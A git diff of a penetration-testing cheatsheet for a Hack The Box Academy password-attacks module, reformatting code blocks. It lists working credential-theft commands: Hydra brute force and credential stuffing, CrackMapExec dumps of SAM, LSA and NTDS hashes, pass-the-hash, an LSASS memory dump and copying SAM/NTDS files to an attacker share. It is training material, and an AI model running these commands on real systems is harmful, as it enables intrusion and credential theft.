@@ -4,45 +4,57 @@ author: amandaguglieri
 draft: false
 TableOfContents: true
 tags:
-  - mariadb
-  - port 3306
-  - mysql
+  - OSCP
 ---
 
 # HTB Cheatsheet - Password attacks module
 
 ## Connecting to Target
 
-```bash
-# CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.
+```bash 
+# CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol
 xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!
+```
 
+```powershell 
 # Uses Evil-WinRM to establish a Powershell session with a target. 
-evil-winrm -i <ip> -u user -p password           
+evil-winrm -i <ip> -u user -p password
+```
 
-# Uses SSH to connect to a target using a specified user.  
+
+```powershell 
+# Uses SSH to connect to a target using a specified user.
 ssh user@<ip>
+```
 
+```powershell 
 # Uses smbclient to connect to an SMB share using a specified user.
 smbclient -U user \\\\<ip>\\SHARENAME
+```
 
-# Uses smbserver.py to create a share 
-on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
+```powershell 
+# Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
 python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/
 ```
 
 ---
-## Password Mutations
-```bash
-# Uses cewl to generate a wordlist based on keywords present on a website. 
+## Password mutations
+```bash 
+# Uses cewl to generate a wordlist based on keywords present on a website.
 cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+```
 
+```bash 
 # Uses Hashcat to generate a rule-based word list.
 hashcat --force password.list -r custom.rule --stdout > mut_password.list
+```
 
+```bash title=""
 # Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. 
 ./username-anarchy -i /path/to/listoffirstandlastnames.txt
+```
 
+```bash title=""
 # Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. 
 curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt
 ```
@@ -50,34 +62,52 @@ curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print to
 ---
 ## Remote Password Attacks
 
-```bash
+```bash title=""
 # Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.
 crackmapexec winrm <ip> -u user.list -p password.list
+```
 
+```bash title=""
 # Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. 
 crackmapexec smb <ip> -u "user" -p "password" --shares
+```
 
+```bash title=""
 # Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
 hydra -L user.list -P password.list <service>://<ip>
+```
 
+```bash title=""
 # Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.
 hydra -l username -P password.list <service>://<ip>
+```
 
+```bash title=""
 # Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.
 hydra -L user.list -p password <service>://<ip>  
+```
 
+```bash title=""
 # Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
 hydra -C <user_pass.list> ssh://<IP>
+```
 
+```bash title=""
 # Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. 
 crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
+```
 
+```bash title=""
 # Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. 
 crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
+```
 
+```bash title=""
 # Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. 
 crackmapexec smb <ip> -u <username> -p <password> --ntds
+```
 
+```bash title=""
 # Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack.
 evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>" 
 ```
@@ -85,34 +115,52 @@ evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"
 ---
 ## Windows Local Password Attacks
 
-```bash
+```bash title=""
 # A command-line-based utility in Windows used to list running processes.
 tasklist /svc                        
+```
 
+```powershell title=""
 # Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
 
+```powershell title=""
 # A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. 
 Get-Process lsass
+```
 
+```powershell title=""
 # Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. 
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
 
+```bash title=""
 # Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. 
 pypykatz lsa minidump /path/to/lsassdumpfile
+```
 
+```powershell title=""
 # Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
 reg.exe save hklm\sam C:\sam.save
+```
 
+```powershell title=""
 # Uses move in Windows to transfer a file to a specified file share over the network. 
 move sam.save \\<ip>\NameofFileShare
+```
 
+```bash title=""
 # Uses Secretsdump.py to dump password hashes from the SAM database.
 python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
 
+```powershell title=""
 # Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. 
 vssadmin CREATE SHADOW /For=C:
+```
 
+```powershell title=""
 # Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. 
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit 
 ```
